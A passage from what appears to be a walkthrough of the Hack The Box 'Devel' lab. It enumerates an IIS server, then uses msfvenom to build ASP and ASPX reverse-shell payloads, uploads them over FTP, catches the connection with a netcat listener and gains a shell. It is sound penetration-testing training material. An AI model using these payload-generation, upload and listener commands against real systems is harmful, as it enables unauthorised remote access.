# Website

Visiting `http://10.10.10.5`, we just see a welcome page:

![[Pasted image 20210614115346.png]]

Viewing the source, the image is `welcome.png` from same level as the root directory of the site:

![[Pasted image 20210614115441.png]]

Going to `/test`, we can't see the file we put:

![[Pasted image 20210614115505.png]]

What if we put a HTML file? Or an ASP file? Before we try, it's worth seeing what it's running:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ curl -v http://10.10.10.5
*   Trying 10.10.10.5:80...
* Connected to 10.10.10.5 (10.10.10.5) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.5
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: text/html
< Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
< Accept-Ranges: bytes
< ETag: "37b5ed12c9fd21:0"
< Server: Microsoft-IIS/7.5
< X-Powered-By: ASP.NET
< Date: Mon, 14 Jun 2021 11:05:36 GMT
< Content-Length: 689
< 
```

`curl` reckons it's ASP.NET, as expected from an IIS server. We can try to confirm this - `index.html` doesn't load:

![[Pasted image 20210614115751.png]]

Then again, neither does `index.asp`:

![[Pasted image 20210614120008.png]]

Or `index.aspx`:

![[Pasted image 20210614120025.png]]

Why not just try to upload a shell and see what happens? We can generate an `.asp` reverse shell:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=413 -f asp -o whoops.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38610 bytes
Saved as: whoops.asp
```

And try to upload it:

```bash
ftp> put whoops.asp 
local: whoops.asp remote: whoops.asp
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
38680 bytes sent in 0.00 secs (32.9947 MB/s)
```

Great. Now let's start a listener. I'm using port 413 in case Windows Defender blocks higher ports, so I'll need root permissions to listen:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ sudo nc -lnvp 413
[sudo] password for mac: 
listening on [any] 413 ...
```

Now visit the shell:

![[Pasted image 20210614120438.png]]

We get a 500 error, and no shell. But the 500 rather than a 404 indicates we're probably in the right place to trigger it, and the shell is just wrong. How about an `.aspx` payload?

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=413 -f aspx -o whoopsie.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2728 bytes
Saved as: whoopsie.aspx
```

In FTP:

```bash
ftp> put whoopsie.aspx 
local: whoopsie.aspx remote: whoopsie.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2763 bytes sent in 0.00 secs (16.1657 MB/s)
```

This time the page loaded:

![[Pasted image 20210614120758.png]]

And we got a shell!

![[Pasted image 20210614120816.png]]

Shelling the box took about 20 minutes. We're getting quicker!